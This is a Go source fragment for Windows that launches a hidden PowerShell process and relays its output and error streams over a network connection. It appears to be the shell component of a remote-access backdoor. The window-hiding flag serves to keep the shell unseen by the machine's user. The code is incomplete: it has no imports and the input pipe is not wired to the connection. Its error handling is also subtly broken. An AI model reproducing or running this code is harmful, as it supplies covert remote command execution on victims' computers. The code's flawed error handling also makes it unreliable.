//go:build windows

package main

type Shell struct {
	placeholder bool
	finished    chan error
	command     *exec.Cmd
	outpipe     io.ReadCloser
	inpipe      io.WriteCloser
	errpipe     io.ReadCloser
}

func initShell(conn net.Conn) *Shell {
	log.Println("loading shell")
	command := exec.Command("powershell")
	command.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	outpipe, err1 := command.StdoutPipe()
	inpipe, err2 := command.StdinPipe()
	errpipe, err3 := command.StderrPipe()

	if err1 != nil || err2 != nil || err3 != nil {
		log.Fatal(err1.Error(), err2.Error(), err3.Error())
	}

	shell := &Shell{
		placeholder: false,
		finished:    make(chan error, 1),
		command:     command,
		outpipe:     outpipe,
		inpipe:      inpipe,
		errpipe:     errpipe,
	}
	go readPipe(shell.outpipe, conn)
	go readPipe(shell.errpipe, conn)
	go func() {
		shell.finished <- shell.command.Run()
		log.Println("finish !!")
	}()
	log.Println("shell started")

	return shell
}
